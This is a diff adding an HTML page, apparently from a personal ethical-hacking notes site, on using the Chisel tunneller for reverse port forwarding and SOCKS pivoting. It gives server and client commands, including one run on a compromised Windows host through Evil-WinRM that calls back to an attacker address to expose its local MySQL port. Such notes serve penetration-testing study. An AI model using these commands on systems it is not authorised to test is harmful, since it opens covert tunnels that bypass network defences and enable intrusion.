@@ -1,0 +1,46 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>What is Chisel?</title>
+  <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+  <h1>What is <code>Chisel</code>?</h1>
+
+  <p class="common">
+    <strong><code>Chisel</code></strong> is a lightweight TCP/UDP tunneller (single static binary) that tunnels arbitrary traffic over HTTP(S).  
+    Written in Go, it's commonly used for reverse tunnels, port forwarding, and pivoting through restrictive networks or proxies.
+  </p>
+
+  <h1 class="blue">Background Chisel</h1>
+  <div class="code-box"><pre><code>./chisel client http://192.168.45.224:8001 R:12345:127.0.0.1:8000 &</code></pre></div>
+  <ul><li>Just attach &</li></ul>
+
+  <h1>Usage</h1>
+  <h2 class="blue">On your machine</h2>
+  <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Linux]
+└─$ ./chisel server -p 8001 --reverse</code></pre></div>
+
+    <h2 class="blue">On the target machine</h2>
+    <div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\apache.ERA\desktop> .\chisel.exe client http://MY_IP:8001 R:12345:127.0.0.1:3306</code></pre></div>
+    <ul>
+      <li>8001 &lt;-> 12345 &lt;-> 3306</li>
+    </ul>
+
+    <h2 class="blue">Use 127.0.0.1</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Linux]
+└─$ mysql --protocol=TCP -h 127.0.0.1 -P 12345 -u root -p</code></pre></div>
+
+
+    <h1>SOCKS Pivoting</h1>
+    <h2 class="blue">On OUR Kali machine</h2>
+    <div class="code-box"><pre><code>./chisel server -p 8001 --reverse</code></pre></div>
+    <h2 class="blue">On the target machine</h2>
+    <div class="code-box"><pre><code>.\chisel.exe client $MY_IP:8001 R:socks</code></pre></div>
+    
+
+</body>
+</html>
